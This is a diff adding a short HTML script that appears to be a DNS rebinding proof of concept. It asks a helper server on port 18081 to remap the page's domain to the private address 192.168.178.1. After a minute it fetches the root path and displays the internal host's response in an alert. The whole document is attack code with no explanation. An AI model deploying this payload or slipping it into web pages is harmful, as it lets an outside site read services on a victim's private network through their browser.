@@ -1,0 +1,16 @@
+<script>
+  function cb(){
+    var xhr =new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4) {
+          alert(xhr.responseText);
+      }
+    }
+    xhr.open("GET","/",false);
+    xhr.send();
+  }
+  var xmlhttp = new XMLHttpRequest();
+  xmlhttp.open("GET","//" + document.domain + ":18081/add?ip=192.168.178.1&domain="+document.domain,true);
+  xmlhttp.send();
+  setTimeout(cb, 60000);
+</script>
